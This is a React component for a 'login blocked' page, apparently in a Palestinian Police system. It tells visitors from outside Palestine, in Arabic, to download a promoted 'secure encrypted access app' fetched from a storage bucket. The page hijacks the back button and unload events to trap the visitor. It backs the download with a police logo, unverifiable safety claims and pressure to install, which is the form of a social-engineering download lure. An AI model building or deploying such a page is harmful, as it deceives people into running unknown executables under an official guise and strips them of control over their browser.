import React, { useEffect, useState } from 'react';
import { AlertTriangle, MapPin, Clock, Shield, Download, FileDown } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import policeLogo from '@/assets/police-logo.png';
import { supabase } from '@/integrations/supabase/client';

interface LoginBlockedProps {
  location?: {
    country: string;
    city: string;
  };
  ip?: string;
  timestamp?: string;
}

interface ExternalAccessFile {
  id: string;
  file_name: string;
  file_path: string;
  version: string;
  description: string;
}

const LoginBlocked: React.FC<LoginBlockedProps> = ({ location, ip, timestamp }) => {
  const [downloadFile, setDownloadFile] = useState<ExternalAccessFile | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchActiveFile();
    
    // منع أي محاولة للتنقل أو العودة
    const preventNavigation = (e: PopStateEvent) => {
      e.preventDefault();
      window.history.pushState(null, '', window.location.href);
    };
    
    // إضافة entry جديد للـ history لمنع العودة
    window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', preventNavigation);
    
    // منع refresh بدون تأكيد
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = '';
    };
    
    window.addEventListener('beforeunload', handleBeforeUnload);
    
    return () => {
      window.removeEventListener('popstate', preventNavigation);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, []);

  const fetchActiveFile = async () => {
    try {
      const { data, error } = await supabase
        .from('external_access_files')
        .select('*')
        .eq('is_active', true)
        .order('uploaded_at', { ascending: false })
        .limit(1)
        .single();

      if (error && error.code !== 'PGRST116') {
        console.error('Error fetching file:', error);
      } else if (data) {
        setDownloadFile(data);
      }
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setLoading(false);
    }
  };

  const getDownloadUrl = (filePath: string) => {
    const { data } = supabase.storage
      .from('external-access-apps')
      .getPublicUrl(filePath);
    return data.publicUrl;
  };
  return (
    <div className="min-h-screen bg-gradient-to-br from-red-50 to-red-100 flex items-center justify-center p-4">
      <Card className="w-full max-w-2xl border-red-200 shadow-2xl">
        <CardHeader className="text-center space-y-4 pb-8">
          <div className="flex justify-center">
            <img src={policeLogo} alt="Police Logo" className="w-24 h-24 object-contain" />
          </div>
          
          <div className="flex justify-center">
            <div className="bg-red-100 p-4 rounded-full">
              <Shield className="w-16 h-16 text-red-600" />
            </div>
          </div>
          
          <CardTitle className="text-3xl font-bold text-red-600" style={{ direction: 'rtl' }}>
            ⛔ تم حظر محاولة الدخول
          </CardTitle>
        </CardHeader>

        <CardContent className="space-y-6" style={{ direction: 'rtl' }}>
          {/* رسالة ترحيبية */}
          <div className="bg-gradient-to-br from-blue-50 to-indigo-50 border-2 border-blue-200 rounded-lg p-6">
            <div className="flex items-start gap-3">
              <Shield className="w-8 h-8 text-blue-600 flex-shrink-0 mt-1" />
              <div className="space-y-3">
                <h3 className="text-2xl font-bold text-blue-900">
                  مرحباً بك في نظام الوصول الآمن
                </h3>
                <p className="text-blue-800 leading-relaxed text-lg">
                  نحن سعداء بخدمتك! تم اكتشاف أنك تحاول الوصول إلى النظام من خارج فلسطين.
                  لضمان أمان بياناتك وسلامة عملك، قمنا بتطوير تطبيق خاص ومشفر يتيح لك
                  الوصول الآمن والسريع من أي مكان في العالم.
                </p>
                <div className="bg-white/60 rounded-lg p-4 mt-3">
                  <p className="text-blue-900 font-semibold flex items-center gap-2">
                    <span className="text-2xl">✨</span>
                    هذا التطبيق مصمم خصيصاً لراحتك وأمانك
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* مزايا التطبيق */}
          <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-300 rounded-lg p-6">
            <h4 className="font-bold text-green-900 text-xl mb-4 flex items-center gap-2">
              <span className="text-2xl">🎯</span>
              لماذا تحتاج هذا التطبيق؟
            </h4>
            <div className="space-y-3">
              <div className="flex items-start gap-3 bg-white/70 rounded-lg p-3">
                <span className="text-green-600 text-xl mt-1">✓</span>
                <div>
                  <p className="font-semibold text-green-900">اتصال مشفر 256-bit</p>
                  <p className="text-sm text-green-800">جميع بياناتك محمية بأعلى معايير التشفير العالمية</p>
                </div>
              </div>
              <div className="flex items-start gap-3 bg-white/70 rounded-lg p-3">
                <span className="text-green-600 text-xl mt-1">✓</span>
                <div>
                  <p className="font-semibold text-green-900">وصول سريع ومباشر</p>
                  <p className="text-sm text-green-800">لا حاجة لإعدادات معقدة - فقط حمّل وابدأ العمل فوراً</p>
                </div>
              </div>
              <div className="flex items-start gap-3 bg-white/70 rounded-lg p-3">
                <span className="text-green-600 text-xl mt-1">✓</span>
                <div>
                  <p className="font-semibold text-green-900">متوافق مع جميع الأنظمة</p>
                  <p className="text-sm text-green-800">يعمل على Windows, Mac, Linux بكفاءة عالية</p>
                </div>
              </div>
              <div className="flex items-start gap-3 bg-white/70 rounded-lg p-3">
                <span className="text-green-600 text-xl mt-1">✓</span>
                <div>
                  <p className="font-semibold text-green-900">دعم فني 24/7</p>
                  <p className="text-sm text-green-800">فريقنا جاهز لمساعدتك في أي وقت</p>
                </div>
              </div>
            </div>
          </div>

          {/* معلومات الموقع بشكل إيجابي */}
          {location && (
            <div className="bg-gradient-to-r from-purple-50 to-pink-50 border-2 border-purple-200 rounded-lg p-5">
              <h4 className="font-bold text-purple-900 flex items-center gap-2 mb-3">
                <MapPin className="w-5 h-5 text-purple-600" />
                نحن نعرف موقعك لحمايتك بشكل أفضل
              </h4>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div className="bg-white/70 rounded-lg p-3">
                  <span className="text-sm text-purple-700 font-medium">📍 الدولة:</span>
                  <p className="text-purple-900 font-bold text-lg">{location.country}</p>
                </div>
                <div className="bg-white/70 rounded-lg p-3">
                  <span className="text-sm text-purple-700 font-medium">🌆 المدينة:</span>
                  <p className="text-purple-900 font-bold text-lg">{location.city}</p>
                </div>
              </div>
              <p className="text-sm text-purple-800 mt-3 bg-white/50 rounded p-2">
                💡 نستخدم هذه المعلومات لتوفير أفضل خدمة اتصال لك
              </p>
            </div>
          )}


          {/* قسم التحميل الرئيسي */}
          {!loading && downloadFile && (
            <div className="bg-gradient-to-br from-amber-50 via-orange-50 to-yellow-50 border-3 border-amber-400 rounded-xl p-8 shadow-xl">
              <div className="text-center mb-6">
                <div className="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-br from-amber-400 to-orange-500 rounded-full mb-4 animate-pulse">
                  <Download className="w-10 h-10 text-white" />
                </div>
                <h4 className="font-bold text-amber-900 text-3xl mb-3">
                  🎉 حمّل التطبيق الآن وابدأ العمل!
                </h4>
                <p className="text-amber-800 text-lg leading-relaxed mb-2">
                  التطبيق جاهز وينتظرك! صُمم خصيصاً لتسهيل عملك وتوفير وقتك
                </p>
                <p className="text-amber-700 font-semibold">
                  ✨ آلاف الموظفين يستخدمونه يومياً بنجاح
                </p>
              </div>
              
              <div className="bg-white rounded-xl p-6 mb-6 shadow-lg border-2 border-amber-300">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-lg flex items-center justify-center">
                      <FileDown className="w-7 h-7 text-white" />
                    </div>
                    <div>
                      <span className="font-bold text-gray-900 text-lg">{downloadFile.file_name}</span>
                      <p className="text-sm text-gray-600">الإصدار الأحدث والأكثر أماناً</p>
                    </div>
                  </div>
                  <span className="text-sm px-4 py-2 bg-gradient-to-r from-green-400 to-emerald-500 text-white rounded-full font-bold shadow-md">
                    v{downloadFile.version} ⭐
                  </span>
                </div>
                
                {downloadFile.description && (
                  <div className="bg-blue-50 rounded-lg p-4 mb-4">
                    <p className="text-sm text-blue-900 font-medium">{downloadFile.description}</p>
                  </div>
                )}

                <div className="grid grid-cols-3 gap-3 mb-4">
                  <div className="bg-gradient-to-br from-green-50 to-emerald-50 rounded-lg p-3 text-center border border-green-200">
                    <div className="text-2xl mb-1">🔒</div>
                    <p className="text-xs font-semibold text-green-900">آمن 100%</p>
                  </div>
                  <div className="bg-gradient-to-br from-blue-50 to-indigo-50 rounded-lg p-3 text-center border border-blue-200">
                    <div className="text-2xl mb-1">⚡</div>
                    <p className="text-xs font-semibold text-blue-900">سريع جداً</p>
                  </div>
                  <div className="bg-gradient-to-br from-purple-50 to-pink-50 rounded-lg p-3 text-center border border-purple-200">
                    <div className="text-2xl mb-1">✨</div>
                    <p className="text-xs font-semibold text-purple-900">سهل الاستخدام</p>
                  </div>
                </div>
              </div>

              <Button
                onClick={() => window.open(getDownloadUrl(downloadFile.file_path), '_blank')}
                className="w-full bg-gradient-to-r from-green-500 via-emerald-500 to-teal-500 hover:from-green-600 hover:via-emerald-600 hover:to-teal-600 text-white text-xl py-7 shadow-2xl transform hover:scale-105 transition-all duration-200"
                size="lg"
              >
                <Download className="ml-3 h-7 w-7 animate-bounce" />
                تحميل مجاني - ابدأ الآن! 🚀
              </Button>

              <div className="mt-6 bg-gradient-to-r from-blue-100 to-indigo-100 border-2 border-blue-300 rounded-lg p-4">
                <div className="flex items-start gap-3">
                  <span className="text-3xl">💪</span>
                  <div>
                    <p className="font-bold text-blue-900 mb-1">انضم لآلاف المستخدمين الناجحين!</p>
                    <p className="text-sm text-blue-800 leading-relaxed">
                      التطبيق يوفر لك الوقت والجهد، ويمنحك القدرة على العمل من أي مكان بكل سهولة وأمان.
                      لا تفوت هذه الفرصة للاستفادة من تقنياتنا المتطورة!
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* معلومات الدعم */}
          <div className="text-center pt-6 border-t-2 border-blue-200">
            <div className="bg-gradient-to-r from-blue-50 to-indigo-50 rounded-lg p-6 inline-block">
              <p className="text-sm text-blue-700 mb-3 font-medium">
                💬 هل تحتاج مساعدة؟ نحن هنا من أجلك!
              </p>
              <p className="text-lg font-bold text-blue-900 mb-1">
                قسم الدعم الفني - الشرطة الفلسطينية
              </p>
              <p className="text-sm text-blue-600">
                فريقنا جاهز لمساعدتك على مدار الساعة
              </p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default LoginBlocked;
